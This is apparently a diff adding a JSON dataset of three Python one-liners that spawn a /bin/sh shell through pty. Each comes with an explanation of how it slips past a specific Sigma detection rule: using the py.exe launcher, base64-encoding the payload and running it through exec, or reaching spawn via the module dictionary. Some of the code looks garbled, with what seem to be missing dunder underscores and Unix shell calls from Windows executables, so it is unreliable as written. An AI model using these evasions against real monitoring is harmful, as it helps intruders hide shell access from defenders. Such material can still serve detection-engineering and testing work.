@@ -1,0 +1,14 @@
+[
+  {
+    "output": "py.exe -c \"import pty; pty.spawn('/bin/sh')\"",
+    "explanation": "The Sigma rule explicitly checks for 'python.exe', 'python3.exe', and 'python2.exe' in the Image field. Using the standard Windows Python launcher 'py.exe' (or simply renaming the python executable) bypasses the 'selection_img' condition entirely."
+  },
+  {
+    "output": "python.exe -c \"exec(import('base64').b64decode('aW1wb3J0IHB0eTsgcHR5LnNwYXduKCIvYmluL3NoIik='))\"",
+    "explanation": "The rule relies on literal string matching for 'import pty' and '.spawn('. By base64 encoding the payload and decoding it at runtime using 'exec()', the command line no longer contains the targeted strings, thereby evading the 'selection_cli_1' and 'selection_cli_2' conditions."
+  },
+  {
+    "output": "python.exe -c \"import('pty').dict'spawn'\"",
+    "explanation": "This technique avoids using the literal string '.spawn(' or the exact phrase 'from pty import spawn'. By accessing the 'spawn' function through the module's dictionary, it breaks the static string patterns the rule is searching for."
+  }
+]
